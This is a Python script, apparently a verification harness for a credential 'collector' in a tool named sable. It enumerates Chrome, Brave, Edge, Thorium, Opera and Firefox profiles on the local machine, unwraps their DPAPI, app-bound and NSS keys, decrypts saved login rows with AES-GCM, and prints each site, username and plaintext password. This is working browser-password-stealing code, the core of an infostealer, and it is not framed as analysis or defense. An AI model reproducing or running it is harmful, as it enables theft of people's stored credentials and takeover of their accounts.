"""The translator, against the live profiles on this machine.

Two questions, and the second is the one that matters: does the key chain unwrap, and
do rows a browser encrypted come back as the text a person typed.

The collector's own functions are used — same key discovery, same copy-before-open,
same AES-GCM — so this is the shipping path, not a reimplementation of it. Nothing is
bundled: the test is about decryption, and copying 3 GB of profile would only make it
slower.

    python translator_check.py
"""

from __future__ import annotations

import json
import os
import sys
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "sable"))

from agent import util  # noqa: E402
from agent.sources.browsers import chromium, gecko  # noqa: E402

LOCAL = Path(os.environ.get("LOCALAPPDATA", ""))
ROAMING = Path(os.environ.get("APPDATA", ""))

ROOTS = (
    ("chrome", LOCAL / r"Google\Chrome\User Data", False),
    ("brave", LOCAL / r"BraveSoftware\Brave-Browser\User Data", False),
    ("edge", LOCAL / r"Microsoft\Edge\User Data", False),
    ("thorium", LOCAL / r"Thorium\User Data", False),
    ("opera", ROAMING / r"Opera Software\Opera Stable", True),
    ("firefox", ROAMING / r"Mozilla\Firefox", False),
)


def _chromium_profiles(root: Path) -> list[Path]:
    try:
        return [
            entry
            for entry in sorted(root.iterdir())
            if entry.is_dir()
            and any((entry / name).is_file() for name in ("Preferences", "Login Data"))
        ]
    except OSError:
        return []


def _gecko_profiles(root: Path) -> list[Path]:
    base = root / "Profiles"
    try:
        return [
            entry
            for entry in sorted(base.iterdir())
            if entry.is_dir() and (entry / "logins.json").is_file()
        ]
    except OSError:
        return []


def chromium_passwords(profile: Path) -> tuple[list[dict], dict, chromium.Keys]:
    keys = chromium.profile_keys(profile)
    target = Path(tempfile.mkdtemp(prefix="sable-xlate-"))
    with util.temp_workspace("sable-xlate-") as scratch:
        entries, status = chromium._passwords(profile, scratch, target, keys)
    published = target / "passwords.json"
    rows = json.loads(published.read_text(encoding="utf-8")) if published.is_file() else []
    return rows, status, keys


def main() -> int:
    recovered: list[str] = []
    checked = 0

    for name, root, is_root in ROOTS:
        if not root.is_dir():
            print(f"{name:<9} not installed")
            continue
        if name == "firefox":
            profiles = _gecko_profiles(root)
        elif is_root:
            profiles = [root]
        else:
            profiles = _chromium_profiles(root)

        for profile in profiles:
            checked += 1
            if name == "firefox":
                target = Path(tempfile.mkdtemp(prefix="sable-gecko-"))
                written = gecko.run_profile(profile, target)
                print(
                    f"{name:<9} {profile.name[:12]:<12} keys=nss  "
                    f"written={written:<3} "
                    f"{'' if written else 'nothing read (no logins.json or no NSS key)'}"
                )
                published = target / "passwords.json"
                if published.is_file():
                    for row in json.loads(published.read_text(encoding="utf-8")):
                        recovered.append(
                            f"{name}/{profile.name}: {row.get('origin', '?')} "
                            f"user={row.get('username', '?')}"
                        )
                continue

            rows, status, keys = chromium_passwords(profile)
            key_note = "user+abe" if keys.user and keys.app_bound else ("user" if keys.user else "-")
            print(
                f"{name:<9} {profile.name[:12]:<12} keys={key_note:<8} "
                f"rows={status['rows']:<3} opened={status['opened']:<3} "
                f"written={status['written']:<3} {status['reason']}"
            )
            for row in rows:
                recovered.append(
                    f"{name}/{profile.name}: {row.get('origin') or row.get('realm') or '?'} "
                    f"user={row.get('username') or '-'} pass={row.get('password') or '-'}"
                )

    if recovered:
        print("\nplaintext recovered from encrypted databases:")
        for line in recovered:
            print("  " + line)
        print("\nheld: DPAPI unwrap -> AES-256-GCM -> plaintext, on live rows")
    else:
        print("\nno plaintext recovered on this machine")
    print(f"checked {checked} profiles")

    if not recovered:
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
